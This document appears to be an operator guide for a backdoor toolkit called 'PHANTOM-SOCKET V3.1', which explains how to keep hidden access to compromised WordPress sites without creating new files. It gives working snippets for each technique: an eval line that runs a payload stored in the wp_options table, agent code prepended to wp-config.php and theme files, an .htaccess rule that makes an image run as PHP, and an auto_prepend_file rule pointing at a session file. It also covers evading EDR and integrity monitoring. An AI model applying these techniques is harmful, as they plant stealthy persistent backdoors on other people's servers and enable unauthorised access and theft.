# PHANTOM-SOCKET V3.1 — NO FILE DROP PERSISTENCE GUIDE

## GHOST PROTOCOL ARCHITECTURE

The core philosophy of V3.1 is **Zero File Drop**. Traditional backdoors create new files (e.g., `shell.php`, `backdoor.exe`), which are easily detected by EDR, AV, and File Integrity Monitoring (FIM). V3.1 instead leverages existing infrastructure to maintain presence.

---

## TECHNIQUE 1: WORDPRESS DATABASE INJECTION

WordPress stores much of its configuration and state in the `wp_options` table. This is an ideal place for covert storage.

### Persistence Mechanism:
1.  Inject the Ghost Agent payload into a benign-looking option (e.g., `widget_text_v2`, `cron_v3_backup`).
2.  Modify the theme's `functions.php` or `index.php` to include a single line that triggers execution:
    ```php
    eval(get_option('widget_text_v2'));
    ```
3.  The payload is fetched from the database, executed in-memory, and never touches the disk as a standalone file.

### Recovery:
To cleanup, simply delete the entry from `wp_options` and remove the `eval` line from the PHP file.

---

## TECHNIQUE 2: EXISTING FILE OVERWRITE (STOMPING)

Instead of creating `cmd.php`, we overwrite or prepend to legitimate files.

### Targets:
-   `wp-config.php`: High value, rarely changed manually.
-   `wp-includes/load-styles.php`: Core file, often ignored by security plugins.
-   `wp-content/themes/[active-theme]/functions.php`: Theme logic, expected to have custom code.

### Implementation:
Ghost Agent V3.1 `inject_php` capability:
-   Reads the original file.
-   Prepends the agent code.
-   Writes back to the same file.

---

## TECHNIQUE 3: .HTACCESS MANIPULATION

The `.htaccess` file can be used to execute arbitrary files or code.

### Persistence Mechanism:
Add a directive to treat a legitimate image or CSS file as PHP:
```apache
<Files "logo.png">
    AddHandler application/x-httpd-php .png
</Files>
```
Then, append the PHP agent code to `logo.png`. The image will still render correctly in most cases, but accessing it directly will trigger the agent.

---

## TECHNIQUE 4: PHP SESSION HIJACKING

PHP sessions are stored as files in `/tmp` or `/var/lib/php/sessions`.

### Persistence Mechanism:
1.  Store the payload in a PHP session variable: `$_SESSION['ghost_payload'] = '...';`.
2.  The session file on disk will contain the payload.
3.  Use `auto_prepend_file` in `.htaccess` or `php.ini` to point to the session file.
    ```apache
    php_value auto_prepend_file "/var/lib/php/sessions/sess_ghost"
    ```

---

## SUMMARY OF V3.1 CONSTRAINTS

| Action | V3.0 (Old) | V3.1 (Ghost) |
| :--- | :--- | :--- |
| **File Creation** | `file_put_contents('shell.php', ...)` | **FORBIDDEN** |
| **Persistence** | New cron job / new file | Overwrite / DB Inject |
| **Communication** | TCP/8443 (Direct) | HTTPS/443 (CF Worker Relay) |
| **Stealth** | Hidden directory | Disguised as Core/Plugin |
| **Cleanup** | `rm shell.php` | Restore original files / DB wipe |
